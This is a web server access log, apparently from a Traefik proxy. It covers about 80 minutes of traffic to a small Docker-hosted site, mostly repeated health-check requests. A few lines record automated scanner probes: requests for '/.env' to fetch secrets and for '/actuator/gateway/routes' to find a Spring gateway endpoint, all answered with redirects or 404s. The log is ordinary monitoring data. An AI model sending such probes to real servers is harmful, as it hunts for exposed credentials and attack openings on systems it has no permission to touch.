167.71.120.76 - - [15/Dec/2023:14:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1155 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1156 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1157 "www@docker" "http://172.28.0.10:80" 1ms
54.37.79.75 - - [15/Dec/2023:14:41:40 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1158 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:14:41:40 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1159 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:14:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1160 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1161 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1162 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1163 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1164 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1165 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1166 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1167 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1168 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1169 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1170 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1171 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1172 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1173 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1174 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1175 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1176 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1177 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1178 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1179 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1180 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1181 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1182 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1183 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1184 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1185 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1186 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1187 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1188 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1189 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1190 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1191 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:14:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1192 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:14:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1193 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:14:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1194 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:14:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1195 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1196 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1197 "www@docker" "http://172.28.0.10:80" 1ms
152.32.207.21 - - [15/Dec/2023:15:01:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1198 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:15:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1199 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1200 "www@docker" "http://172.28.0.10:80" 1ms
152.32.207.21 - - [15/Dec/2023:15:01:42 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1201 "-" "-" 0ms
152.32.207.21 - - [15/Dec/2023:15:01:43 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1202 "-" "-" 0ms
152.32.207.21 - - [15/Dec/2023:15:01:44 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1203 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:15:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1204 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1205 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1206 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1207 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1208 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1209 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:15:04:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1210 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:15:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1211 "www@docker" "http://172.28.0.10:80" 4ms
167.71.120.76 - - [15/Dec/2023:15:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1212 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1213 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:15:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1214 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:15:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1215 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1216 "www@docker" "http://172.28.0.10:80" 1ms
118.193.59.194 - - [15/Dec/2023:15:07:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1217 "-" "-" 0ms
118.193.59.194 - - [15/Dec/2023:15:08:00 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1218 "-" "-" 0ms
118.193.59.194 - - [15/Dec/2023:15:08:02 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1219 "-" "-" 0ms
118.193.59.194 - - [15/Dec/2023:15:08:04 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1220 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:15:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1221 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1222 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1223 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1224 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:15:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1225 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1226 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1227 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1228 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:15:11:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1229 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:15:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1230 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1231 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1232 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1233 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1234 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1235 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1236 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1237 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1238 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1239 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1240 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1241 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1242 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1243 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:15:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1244 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1245 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1246 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1247 "www@docker" "http://172.28.0.10:80" 1ms
83.97.73.87 - - [15/Dec/2023:15:20:58 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 1248 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:15:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1249 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1250 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1251 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1252 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1253 "www@docker" "http://172.28.0.10:80" 1ms
83.97.73.87 - - [15/Dec/2023:15:23:32 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 1254 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:15:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1255 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1256 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1257 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1258 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1259 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1260 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1261 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1262 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1263 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1264 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1265 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1266 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1267 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1268 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1269 "www@docker" "http://172.28.0.10:80" 2ms
159.203.109.206 - - [15/Dec/2023:15:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1270 "www@docker" "http://172.28.0.10:80" 2ms
167.71.120.76 - - [15/Dec/2023:15:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1271 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1272 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1273 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1274 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1275 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1276 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:15:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1277 "www@docker" "http://172.28.0.10:80" 1ms
54.36.115.221 - - [15/Dec/2023:15:35:11 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1278 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [15/Dec/2023:15:35:12 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1279 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:15:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1280 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1281 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:15:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1282 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:15:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1283 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1284 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1285 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1286 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1287 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1288 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1289 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1290 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1291 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1292 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1293 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1294 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1295 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1296 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1297 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1298 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1299 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1300 "www@docker" "http://172.28.0.10:80" 1ms
152.32.149.246 - - [15/Dec/2023:15:45:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1301 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:15:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1302 "www@docker" "http://172.28.0.10:80" 1ms
152.32.149.246 - - [15/Dec/2023:15:45:55 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1303 "-" "-" 0ms
152.32.149.246 - - [15/Dec/2023:15:45:57 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1304 "-" "-" 0ms
152.32.149.246 - - [15/Dec/2023:15:45:58 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1305 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:15:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1306 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1307 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1308 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1309 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1310 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:15:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1311 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1312 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:15:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1313 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1314 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1315 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1316 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1317 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1318 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1319 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1320 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1321 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1322 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1323 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:15:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1324 "www@docker" "http://172.28.0.10:80" 1ms
139.162.217.163 - - [15/Dec/2023:15:55:30 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 1325 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:15:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1326 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1327 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1328 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1329 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1330 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:15:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1331 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1332 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:15:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1333 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:15:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1334 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1335 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1336 "www@docker" "http://172.28.0.10:80" 1ms
103.218.240.168 - - [15/Dec/2023:16:00:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1337 "-" "-" 0ms
103.218.240.168 - - [15/Dec/2023:16:01:08 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1338 "-" "-" 0ms
